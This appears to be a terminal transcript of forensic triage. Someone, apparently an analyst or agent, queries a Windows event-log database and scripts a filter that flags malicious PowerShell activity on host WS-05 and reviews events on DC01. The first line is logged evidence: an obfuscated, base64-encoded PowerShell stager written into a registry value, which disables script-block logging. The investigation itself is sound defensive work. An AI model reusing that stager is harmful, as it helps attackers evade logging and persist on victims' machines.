-ParameterBinding(Invoke-Expression): name="Command"; value="$RegPath = 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug';$parts = $RegPath.split('\');$path = $RegPath.split("\")[0..($parts.count -2)] -join '\';$name = $parts[-1];$null=Set-ItemProperty -Force -Path $path -Name $name -Value SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAG
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT DISTINCT host FROM events WHERE event_code IN (800, 4103);"
-[?2004lWS-05.corp.example
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT host, event_code, COUNT(*) FROM events WHERE user LIKE '%pgustavo%' GROUP BY host, event_code;"
-[?2004lWS-05.corp.example|3|10
-WS-05.corp.example|4656|32
-WS-05.corp.example|4658|64
-WS-05.corp.example|4663|1
-WS-05.corp.example|4690|32
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT event_id, event_code, timestamp, user, target_object, details, message FROM events WHERE user LIKE '%pgustavo%' AND event_code IN (4656, 4658, 4663, 4690) LIMIT 20;"
-[?2004levt-00285|4690|2026-05-06T00:00:17.152Z|pgustavo|||An attempt was made to duplicate a handle to an object.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Source Handle Information:
-	Source Handle ID:	0x1184
-	Source Process ID:	0x2374
-
-New Handle Information:
-	Target Handle ID:	0x3fd4
-	Target Process ID:	0x4
-evt-00288|4658|2026-05-06T00:00:17.152Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x3fd4
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00291|4656|2026-05-06T00:00:17.153Z|pgustavo|||A handle to an object was requested.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Object Type:		Key
-	Object Name:		\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-	Handle ID:		0x1184
-	Resource Attributes:	-
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-
-Access Request Information:
-	Transaction ID:		{00000000-0000-0000-0000-000000000000}
-	Accesses:		READ_CONTROL
-				Query key value
-				Enumerate sub-keys
-				Notify about changes to keys
-				
-	Access Reasons:		-
-	Access Mask:		0x20019
-	Privileges Used for Access Check:	-
-	Restricted SID Count:	0
-evt-00292|4658|2026-05-06T00:00:17.153Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x1184
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00293|4690|2026-05-06T00:00:17.153Z|pgustavo|||An attempt was made to duplicate a handle to an object.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Source Handle Information:
-	Source Handle ID:	0x1184
-	Source Process ID:	0x2374
-
-New Handle Information:
-	Target Handle ID:	0x3fd4
-	Target Process ID:	0x4
-evt-00294|4658|2026-05-06T00:00:17.153Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x3fd4
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00295|4656|2026-05-06T00:00:17.153Z|pgustavo|||A handle to an object was requested.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Object Type:		Key
-	Object Name:		\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-	Handle ID:		0x1184
-	Resource Attributes:	-
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-
-Access Request Information:
-	Transaction ID:		{00000000-0000-0000-0000-000000000000}
-	Accesses:		READ_CONTROL
-				Query key value
-				Enumerate sub-keys
-				Notify about changes to keys
-				
-	Access Reasons:		-
-	Access Mask:		0x20019
-	Privileges Used for Access Check:	-
-	Restricted SID Count:	0
-evt-00296|4658|2026-05-06T00:00:17.153Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x1184
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00297|4690|2026-05-06T00:00:17.153Z|pgustavo|||An attempt was made to duplicate a handle to an object.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Source Handle Information:
-	Source Handle ID:	0x1184
-	Source Process ID:	0x2374
-
-New Handle Information:
-	Target Handle ID:	0x3fd4
-	Target Process ID:	0x4
-evt-00298|4658|2026-05-06T00:00:17.154Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x3fd4
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00299|4656|2026-05-06T00:00:17.154Z|pgustavo|||A handle to an object was requested.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Object Type:		Key
-	Object Name:		\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-	Handle ID:		0x1184
-	Resource Attributes:	-
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-
-Access Request Information:
-	Transaction ID:		{00000000-0000-0000-0000-000000000000}
-	Accesses:		READ_CONTROL
-				Query key value
-				Enumerate sub-keys
-				Notify about changes to keys
-				
-	Access Reasons:		-
-	Access Mask:		0x20019
-	Privileges Used for Access Check:	-
-	Restricted SID Count:	0
-evt-00300|4658|2026-05-06T00:00:17.154Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x1184
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00301|4690|2026-05-06T00:00:17.154Z|pgustavo|||An attempt was made to duplicate a handle to an object.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Source Handle Information:
-	Source Handle ID:	0x1184
-	Source Process ID:	0x2374
-
-New Handle Information:
-	Target Handle ID:	0x3fd4
-	Target Process ID:	0x4
-evt-00302|4658|2026-05-06T00:00:17.154Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x3fd4
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00303|4656|2026-05-06T00:00:17.154Z|pgustavo|||A handle to an object was requested.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Object Type:		Key
-	Object Name:		\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-	Handle ID:		0x1184
-	Resource Attributes:	-
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-
-Access Request Information:
-	Transaction ID:		{00000000-0000-0000-0000-000000000000}
-	Accesses:		READ_CONTROL
-				Query key value
-				Enumerate sub-keys
-				Notify about changes to keys
-				
-	Access Reasons:		-
-	Access Mask:		0x20019
-	Privileges Used for Access Check:	-
-	Restricted SID Count:	0
-evt-00304|4658|2026-05-06T00:00:17.154Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x1184
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00305|4690|2026-05-06T00:00:17.155Z|pgustavo|||An attempt was made to duplicate a handle to an object.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Source Handle Information:
-	Source Handle ID:	0x1184
-	Source Process ID:	0x2374
-
-New Handle Information:
-	Target Handle ID:	0x3fd4
-	Target Process ID:	0x4
-evt-00306|4658|2026-05-06T00:00:17.155Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x3fd4
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-evt-00307|4656|2026-05-06T00:00:17.155Z|pgustavo|||A handle to an object was requested.
-
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Object Type:		Key
-	Object Name:		\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-	Handle ID:		0x1184
-	Resource Attributes:	-
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-
-Access Request Information:
-	Transaction ID:		{00000000-0000-0000-0000-000000000000}
-	Accesses:		READ_CONTROL
-				Query key value
-				Enumerate sub-keys
-				Notify about changes to keys
-				
-	Access Reasons:		-
-	Access Mask:		0x20019
-	Privileges Used for Access Check:	-
-	Restricted SID Count:	0
-evt-00308|4658|2026-05-06T00:00:17.156Z|pgustavo|||The handle to an object was closed.
-
-Subject :
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1104
-	Account Name:		pgustavo
-	Account Domain:		CORP
-	Logon ID:		0x24579A8
-
-Object:
-	Object Server:		Security
-	Handle ID:		0x1184
-
-Process Information:
-	Process ID:		0x2374
-	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/collect_malicious.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's find all events containing {b59756a9-b239-5f17-5307-000000000400} or powershell.exe on WS-05
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, image, parent_image, command_line, message, details 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'WS-05.corp.example'
-[?2004l[?2004h> """)
-[?2004l[?2004h> 
-[?2004l[?2004h> all_rows = cursor.fetchall()
-[?2004l[?2004h> malicious_ids = set()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's check which ones are malicious
-[?2004l[?2004h> for r in all_rows:
-[?2004l[?2004h>     eid, ec, ts, img, pimg, cmd, msg, det = r
-[?2004l[?2004h>     msg = msg or ""
-[?2004l[?2004h>     det = det or ""
-[?2004l[?2004h>     img = img or ""
-[?2004l[?2004h>     pimg = pimg or ""
-[?2004l[?2004h>     cmd = cmd or ""
-[?2004l[?2004h>     
-[?2004l[?2004h>     is_malicious = False
-[?2004l[?2004h>     
-[?2004l[?2004h>     # 1. Any PowerShell events (800, 4103) are malicious on this host
-[?2004l[?2004h>     if ec in (800, 4103):
-[?2004l[?2004h>         is_malicious = True
-[?2004l[?2004h>     
-[?2004l[?2004h>     # 2. Any event explicitly containing the malicious process GUID
-[?2004l[?2004h>     if "{b59756a9-b239-5f17-5307-000000000400}" in str(r):
-[?2004l[?2004h>         is_malicious = True
-[?2004l[?2004h>         
-[?2004l[?2004h>     # 3. Any event referencing process ID 9076 or hex 0x2374
-[?2004l[?2004h>     if "9076" in msg or "0x2374" in msg or "9076" in det or "0x2374" in det:
-[?2004l[?2004h>         is_malicious = True
-[?2004l[?2004h>         
-[?2004l[?2004h>     # 4. Any event with image as powershell.exe
-[?2004l[?2004h>     if "powershell.exe" in img.lower() or "powershell.exe" in pimg.lower() or "powershell.exe" in cmd.lower():
-[?2004l[?2004h>         is_malicious = True
-[?2004l[?2004h>         
-[?2004l[?2004h>     if is_malicious:
-[?2004l[?2004h>         malicious_ids.add((eid, ec, ts))
-[?2004l[?2004h> 
-[?2004l[?2004h> print(f"Found {len(malicious_ids)} malicious events.")
-[?2004l[?2004h> malicious_ids = sorted(list(malicious_ids), key=lambda x: x[2])
-[?2004l[?2004h> for m in malicious_ids:
-[?2004l[?2004h>     print(f"{m[0]} | {m[1]} | {m[2]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/collect_malicious.py > /tmp/mal_events.txt
-[?2004l[?2004hroot@330dbb2b3463:~# head -n 50 /tmp/mal_events.txt
-[?2004lFound 309 malicious events.
-evt-00019 | 800 | 2026-05-06T00:00:01.015Z
-evt-00021 | 4103 | 2026-05-06T00:00:01.016Z
-evt-00020 | 800 | 2026-05-06T00:00:01.016Z
-evt-00024 | 800 | 2026-05-06T00:00:01.017Z
-evt-00022 | 4103 | 2026-05-06T00:00:01.017Z
-evt-00023 | 800 | 2026-05-06T00:00:01.017Z
-evt-00025 | 4103 | 2026-05-06T00:00:01.018Z
-evt-00027 | 800 | 2026-05-06T00:00:01.019Z
-evt-00026 | 800 | 2026-05-06T00:00:01.019Z
-evt-00032 | 5156 | 2026-05-06T00:00:02.019Z
-evt-00031 | 4103 | 2026-05-06T00:00:02.019Z
-evt-00030 | 5158 | 2026-05-06T00:00:02.019Z
-evt-00034 | 12 | 2026-05-06T00:00:03.020Z
-evt-00033 | 4103 | 2026-05-06T00:00:03.020Z
-evt-00088 | 3 | 2026-05-06T00:00:05.040Z
-evt-00099 | 800 | 2026-05-06T00:00:06.048Z
-evt-00100 | 800 | 2026-05-06T00:00:06.048Z
-evt-00101 | 4103 | 2026-05-06T00:00:06.049Z
-evt-00103 | 4103 | 2026-05-06T00:00:06.050Z
-evt-00105 | 800 | 2026-05-06T00:00:06.051Z
-evt-00108 | 800 | 2026-05-06T00:00:06.052Z
-evt-00109 | 4103 | 2026-05-06T00:00:06.052Z
-evt-00112 | 800 | 2026-05-06T00:00:06.053Z
-evt-00111 | 800 | 2026-05-06T00:00:06.053Z
-evt-00110 | 12 | 2026-05-06T00:00:06.053Z
-evt-00113 | 4103 | 2026-05-06T00:00:07.052Z
-evt-00114 | 4103 | 2026-05-06T00:00:07.053Z
-evt-00118 | 5158 | 2026-05-06T00:00:07.054Z
-evt-00119 | 5156 | 2026-05-06T00:00:07.054Z
-evt-00129 | 3 | 2026-05-06T00:00:08.065Z
-evt-00181 | 800 | 2026-05-06T00:00:11.096Z
-evt-00180 | 800 | 2026-05-06T00:00:11.096Z
-evt-00183 | 4103 | 2026-05-06T00:00:11.098Z
-evt-00182 | 4103 | 2026-05-06T00:00:11.098Z
-evt-00185 | 800 | 2026-05-06T00:00:11.099Z
-evt-00184 | 800 | 2026-05-06T00:00:11.099Z
-evt-00186 | 4103 | 2026-05-06T00:00:11.100Z
-evt-00187 | 800 | 2026-05-06T00:00:11.100Z
-evt-00188 | 800 | 2026-05-06T00:00:12.100Z
-evt-00190 | 12 | 2026-05-06T00:00:12.101Z
-evt-00191 | 5158 | 2026-05-06T00:00:12.101Z
-evt-00193 | 5156 | 2026-05-06T00:00:12.104Z
-evt-00192 | 4103 | 2026-05-06T00:00:12.104Z
-evt-00194 | 4103 | 2026-05-06T00:00:13.115Z
-evt-00195 | 3 | 2026-05-06T00:00:13.115Z
-evt-00238 | 800 | 2026-05-06T00:00:16.128Z
-evt-00240 | 4103 | 2026-05-06T00:00:16.130Z
-evt-00241 | 800 | 2026-05-06T00:00:16.130Z
-evt-00239 | 800 | 2026-05-06T00:00:16.130Z
-[?2004hroot@330dbb2b3463:~# wc -l /tmp/mal_events.txt
-[?2004l310 /tmp/mal_events.txt
-[?2004hroot@330dbb2b3463:~# cut -d '|' -f 2 /tmp/mal_events.txt | sort | uniq -c
-[?2004l     11  12 
-      2  13 
-     10  3 
-     62  4103 
-     32  4656 
-     64  4658 
-      1  4663 
-     32  4690 
-     11  5156 
-     11  5158 
-     73  800 
-      1 Found 309 malicious events.
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/check_dc01.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Find all non-noise events on DC01
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, user, target_user, image, parent_image, command_line, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'DC01.corp.example' 
-[?2004l[?2004h>       AND event_code NOT IN (5156, 5158) 
-[?2004l[?2004h>       AND (user IS NULL OR user NOT LIKE 'WEC$') 
-[?2004l[?2004h>       AND (target_user IS NULL OR target_user NOT LIKE 'WEC$')
-[?2004l[?2004h>       AND (image IS NULL OR image NOT LIKE '%dns.exe%')
-[?2004l[?2004h> """)
-[?2004l[?2004h> rows = cursor.fetchall()
-[?2004l[?2004h> print(f"Found {len(rows)} potentially interesting events on DC01:")
-[?2004l[?2004h> for r in rows:
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Time: {r[2]} | User: {r[3]} | TargetUser: {r[4]} | Image: {r[5]} | Cmd: {r[7]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/check_dc01.py
-[?2004lFound 61 potentially interesting events on DC01:
-ID: evt-00072 | Code: 9 | Time: 2026-05-06T00:00:03.027Z | User:  | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00073 | Code: 9 | Time: 2026-05-06T00:00:03.028Z | User:  | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00074 | Code: 18 | Time: 2026-05-06T00:00:03.028Z | User:  | TargetUser:  | Image: System | Cmd: 
-ID: evt-00075 | Code: 18 | Time: 2026-05-06T00:00:03.028Z | User:  | TargetUser:  | Image: System | Cmd: 
-ID: evt-00076 | Code: 18 | Time: 2026-05-06T00:00:03.028Z | User:  | TargetUser:  | Image: System | Cmd: 
-ID: evt-00077 | Code: 18 | Time: 2026-05-06T00:00:03.028Z | User:  | TargetUser:  | Image: System | Cmd: 
-ID: evt-00078 | Code: 3 | Time: 2026-05-06T00:00:03.028Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00079 | Code: 3 | Time: 2026-05-06T00:00:03.028Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00080 | Code: 3 | Time: 2026-05-06T00:00:04.033Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00081 | Code: 3 | Time: 2026-05-06T00:00:05.038Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: System | Cmd: 
-ID: evt-00082 | Code: 3 | Time: 2026-05-06T00:00:05.038Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00083 | Code: 3 | Time: 2026-05-06T00:00:05.039Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00084 | Code: 3 | Time: 2026-05-06T00:00:05.039Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00085 | Code: 3 | Time: 2026-05-06T00:00:05.039Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00087 | Code: 3 | Time: 2026-05-06T00:00:05.040Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00115 | Code: 7 | Time: 2026-05-06T00:00:07.053Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00116 | Code: 7 | Time: 2026-05-06T00:00:07.053Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00117 | Code: 12 | Time: 2026-05-06T00:00:07.054Z | User:  | TargetUser:  | Image: C:\windows\system32\svchost.exe | Cmd: 
-ID: evt-00130 | Code: 3 | Time: 2026-05-06T00:00:09.073Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00133 | Code: 13 | Time: 2026-05-06T00:00:09.076Z | User:  | TargetUser:  | Image: C:\windows\system32\svchost.exe | Cmd: 
-ID: evt-00153 | Code: 7 | Time: 2026-05-06T00:00:11.090Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00154 | Code: 7 | Time: 2026-05-06T00:00:11.090Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00155 | Code: 7 | Time: 2026-05-06T00:00:11.090Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00156 | Code: 3 | Time: 2026-05-06T00:00:11.090Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00157 | Code: 3 | Time: 2026-05-06T00:00:11.090Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00158 | Code: 3 | Time: 2026-05-06T00:00:11.091Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00159 | Code: 3 | Time: 2026-05-06T00:00:11.091Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00160 | Code: 3 | Time: 2026-05-06T00:00:11.091Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00161 | Code: 3 | Time: 2026-05-06T00:00:11.091Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00162 | Code: 3 | Time: 2026-05-06T00:00:11.093Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00163 | Code: 3 | Time: 2026-05-06T00:00:11.093Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00164 | Code: 3 | Time: 2026-05-06T00:00:11.093Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00165 | Code: 3 | Time: 2026-05-06T00:00:11.093Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00166 | Code: 3 | Time: 2026-05-06T00:00:11.093Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00167 | Code: 3 | Time: 2026-05-06T00:00:11.093Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00218 | Code: 7 | Time: 2026-05-06T00:00:13.122Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00271 | Code: 5 | Time: 2026-05-06T00:00:17.146Z | User:  | TargetUser:  | Image: C:\Windows\System32\wbem\WmiPrvSE.exe | Cmd: 
-ID: evt-00272 | Code: 4703 | Time: 2026-05-06T00:00:17.146Z | User: DC01$ | TargetUser: DC01$ | Image:  | Cmd: 
-ID: evt-00273 | Code: 4689 | Time: 2026-05-06T00:00:17.148Z | User: DC01$ | TargetUser:  | Image:  | Cmd: 
